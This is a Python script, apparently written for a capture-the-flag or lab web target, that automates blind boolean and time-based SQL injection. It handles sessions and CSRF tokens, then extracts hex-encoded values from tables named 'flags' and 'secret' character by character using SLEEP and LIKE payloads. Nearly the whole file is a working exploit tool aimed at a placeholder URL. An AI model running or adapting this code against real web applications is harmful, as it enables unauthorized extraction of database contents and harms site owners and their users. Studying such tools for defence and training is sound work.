"""
TOOL: SQLi Blind/Time-Based Automator

Category: Web Security
Description: Framework to automate Blind and Time-Based SQL Injections.
Automatically handles HTTP Sessions and CSRF tokens.

Algorithm:
- Connects to the target and retrieves the CSRF token.
- Uses a dictionary to guess characters one by one.
- Evaluates the server's response (either boolean 'Success' or execution time).
"""

import requests

class Inj:
    def __init__(self, host):
        self.sess = requests.Session() # Start the session to save cookies
        self.base_url = f'{host}/api/'
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token').json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        # Return the entire request object so we can read the response times!
        return self.sess.post(url, json=data, headers=headers)

    def logic(self, query):
        return self._do_raw_req(self.base_url + 'logic', query)

    def union(self, query):
        return self._do_raw_req(self.base_url + 'union', query)

    def blind(self, query):
        return self._do_raw_req(self.base_url + 'blind', query)

    def time_based(self, query):
        return self._do_raw_req(self.base_url + 'time', query)


# --- ATTACK FUNCTIONS ---

def exploit_time_based(target_url):
    print("[*] Starting Time-Based SQLi attack...")
    inj = Inj(target_url)
    dictionary = '0123456789abcdef'
    result = ''

    while True:
        for c in dictionary:
            question = f"1' AND (SELECT SLEEP(2) FROM flags WHERE HEX(flag) LIKE '{result+c}%')='1"
            
            # Execute the query
            response = inj.time_based(question)
            
            # PRO-TIP: Use the internal requests timer!
            elapsed = response.elapsed.total_seconds()
            
            if elapsed > 1.5:  # Safety margin for network latency
                result += c
                print(f"\r[+] Found: {result}", end='', flush=True)
                break
        else:
            # If the for loop finishes without hitting "break", we found the whole flag
            break
            
    print(f"\n[!] Attack finished. Hex Result: {result}")
    # Note: Remember to decode from Hex to Text (e.g., using bytes.fromhex(result).decode())


def exploit_blind(target_url):
    print("[*] Starting Blind SQLi attack...")
    inj = Inj(target_url)
    dictionary = '0123456789abcdef'
    result = ''

    while True:
        for c in dictionary:
            question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
            
            response = inj.blind(question)
            json_data = response.json()
            
            if json_data.get('result') == 'Success': 
                result += c
                print(f"\r[+] Found: {result}", end='', flush=True)
                break
        else:
            break
            
    print(f"\n[!] Attack finished. Hex Result: {result}")


if __name__ == '__main__':
    # Modify the URL below before running!
    TARGET = 'http://YOUR_URL'
    
    # Uncomment the attack you want to use:
    # exploit_blind(TARGET)
    exploit_time_based(TARGET)